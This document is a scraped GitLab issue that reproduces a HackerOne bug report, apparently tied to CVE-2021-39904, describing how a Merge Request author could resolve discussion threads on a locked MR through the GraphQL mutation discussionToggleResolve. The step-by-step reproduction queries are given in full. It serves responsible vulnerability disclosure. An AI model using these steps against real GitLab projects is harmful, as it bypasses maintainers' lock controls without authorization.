=== Content from gitlab.com_c4eba86b_20250115_084507.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# GraphQL mutations allow Merge Request creator to bypass locked status

**[HackerOne report #1063420](https://hackerone.com/reports/1063420)** by `jimeno` on 2020-12-21, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hi GitLab,

I'd like to report an Improper Access Control issue where attacker is able to perform state changing actions such as (un-)resolving discussion threads in Merge Requests after the repository owner locks the MR. The mutation used in this example is `discussionToggleResolve`.

##### Scenario setup

1. Victim: create a public repository and add a dummy file to it
2. Attacker: fork the project and add a change to it
3. Attacker: submit a Merge Request
4. Any: add a comment so a discussion thread is generated
5. Victim: lock the Merge Request (notice the attacker isn't able to (un-)resolve the existing discussions anymore)

   [![setup_final_status.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/ff1ddef8bfb51d9f60a007ab1991c34c34b4bc1c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65313337653532652d363433302d343564392d386536372d3434623539333134393966652f73657475705f66696e616c5f7374617475732e706e67)

##### Steps to reproduce

1. Attacker: notice you aren't able to post new comments or resolve the discussion thread via the user interface

   [![attacker_opens_locked_mr.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/6a1e18d699fe1578f7323fab3517e7ecd300d7d3/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30613037363239662d616534302d343732322d626366372d6634343162396663393539302f61747461636b65725f6f70656e735f6c6f636b65645f6d722e706e67)
2. Attacker: run the following [GraphQL](https://gitlab.com/-/graphql-explorer) query to find the ID of the discussion thread. Please, replace the repo and owner where needed

   ```
   {
     project(fullPath: &#34;naaytesting/bugbountydemo&#34;) {
       mergeRequests {
         edges {
           node {
             id
             title
             discussions {
               edges {
                 node {
                   id
                   resolvable
                   notes {
                     edges {
                       node {
                         body
                       }
                     }
                   }
                 }
               }
             }
           }
         }
       }
     }
   }
   ```
3. Attacker: note the discussion ID. In my case it is `gid://gitlab/DiffDiscussion/da18f8200f0934b43fd1d1f62d5ea1a8dec2e1a8`. Notice its `resolvable` attribute is set to `true` while the UI shows the MR is completely locked and doesn't allow to (un-)resolve it.
4. Run the following GraphQL query replacing the ID with yours.

   ```
   mutation test {
     discussionToggleResolve(input: {id: &#34;gid://gitlab/DiffDiscussion/da18f8200f0934b43fd1d1f62d5ea1a8dec2e1a8&#34;, resolve: true}) {
       errors
     }
   }
   ```
5. Victim: refresh the MR and notice the attacker was able to perform activities against it and the discussion is resolved now.

   [![attacker_activity_in_pr_after_locking.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0bb32572d1baf64d78b89d6957823c7697efd169/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31623934316465312d646363332d343135342d393635382d6462616538613235366337312f61747461636b65725f61637469766974795f696e5f70725f61667465725f6c6f636b696e672e706e67)

##### Impact

Attacker is able to do state-changing actions against a locked MR. In this particular case, (un-)resolve discussion threads.

##### Examples

GitLab.com users can perform state-changing actions in their Merge Requests after the repository owners have locked them.

##### What is the current *bug* behavior?

Attacker is able to do state-changing actions against a locked MR. In this particular case, (un-)resolve discussion threads.

##### What is the expected *correct* behavior?

Attacker isn't able to do state-changing actions after the repo owner locks their MR.

##### Relevant logs and/or screenshots

Please, refer to each section.

##### Output of checks

This bug happens on GitLab.com

###### Results of GitLab environment info

N/A

#### Impact

Attacker is able to do state-changing actions against a locked MR. In this particular case, (un-)resolve discussion threads.

If this is the expected behavior, please let me know and I'll be happy to self-close this report as N/A.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [attacker\_opens\_locked\_mr.png](https://h1.sec.gitlab.net/a/0a07629f-ae40-4722-bcf7-f441b9fc9590/attacker_opens_locked_mr.png)
* [attacker\_activity\_in\_pr\_after\_locking.png](https://h1.sec.gitlab.net/a/1b941de1-dcc3-4154-9658-dbae8a256c71/attacker_activity_in_pr_after_locking.png)
* [setup\_final\_status.png](https://h1.sec.gitlab.net/a/e137e52e-6430-45d9-8e67-44b5931499fe/setup_final_status.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_1d8da82a_20250115_084506.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-39904.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-39904.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-39904.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-39904.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  May 11, 2022

  [3b43fcb8](/gitlab-org/cves/-/commit/3b43fcb8a5efe80d66b185f2d59781d800515288)
  [Publishing 1 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/3b43fcb8a5efe80d66b185f2d59781d800515288)
  ·
  3b43fcb8

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 11, 2022

  3b43fcb8

  [Publishing 1 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/3b43fcb8a5efe80d66b185f2d59781d800515288)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 11, 2022

Loading


